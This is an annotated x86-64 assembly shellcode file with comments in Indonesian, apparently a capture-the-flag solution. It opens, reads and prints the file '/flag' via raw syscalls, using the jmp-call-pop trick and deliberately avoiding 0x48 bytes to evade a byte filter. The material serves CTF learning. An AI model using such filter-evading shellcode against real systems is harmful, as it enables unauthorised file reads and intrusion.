bits 64
global _start



section .text
_start:
    ; 1. JMP-CALL-POP untuk mendapatkan alamat string "/flag"
    jmp get_flag_string

code:
    ; =========================================
    ; TAHAP 1: OPEN("/flag", O_RDONLY)
    ; =========================================
    pop rdi        ; rdi sekarang menunjuk ke string "/flag" (Instruksi: 5f)
    xor esi, esi   ; Argumen ke-2: flags = 0 (O_RDONLY). (Instruksi: 31 f6)
    xor edx, edx   ; Argumen ke-3: mode = 0. (Instruksi: 31 d2)
    push 2
    pop rax        ; syscall number 2 = sys_open. (Instruksi: 6a 02, 58)
    syscall        ; (Instruksi: 0f 05)

    ; Setelah open berhasil, File Descriptor (FD) file /flag akan disimpan di rax.
    ; Biasanya nilainya adalah 3 (karena 0=stdin, 1=stdout, 2=stderr).

    ; =========================================
    ; TAHAP 2: READ(fd, buffer, size)
    ; =========================================
    ; Pindahkan FD dari rax ke rdi (sebagai argumen pertama read).
    ; Kita pakai register 32-bit agar tidak muncul byte 0x48!
    mov edi, eax   ; (Instruksi: 89 c7)

    ; Untuk buffer, kita pakai saja Stack Pointer (rsp).
    ; DILARANG pakai 'mov rsi, rsp' karena menghasilkan 0x48. Pakai push/pop!
    push rsp
    pop rsi        ; rsi sekarang menunjuk ke pucuk stack. (Instruksi: 54, 5e)

    ; Tentukan ukuran byte yang mau dibaca, misalnya 96 bytes (0x60).
    push 0x60
    pop rdx        ; rdx = 96. (Instruksi: 6a 60, 5a)

    ; Set rax = 0 untuk sys_read
    xor eax, eax   ; (Instruksi: 31 c0)
    syscall        ; (Instruksi: 0f 05)

    ; Sekarang isi dari /flag sudah tertulis di dalam stack (memori).

    ; =========================================
    ; TAHAP 3: WRITE(stdout, buffer, size)
    ; =========================================
    push 1
    pop rdi        ; Argumen 1: stdout = 1. (Instruksi: 6a 01, 5f)

    ; Argumen 2 (rsi) MASIH menunjuk ke stack yang berisi isi file flag.
    ; Argumen 3 (rdx) MASIH bernilai 96 (ukuran). Jadi tidak perlu diubah.

    ; Set rax = 1 untuk sys_write
    push 1
    pop rax        ; (Instruksi: 6a 01, 58)
    syscall        ; (Instruksi: 0f 05)

get_flag_string:
    call code
    db '/flag', 0
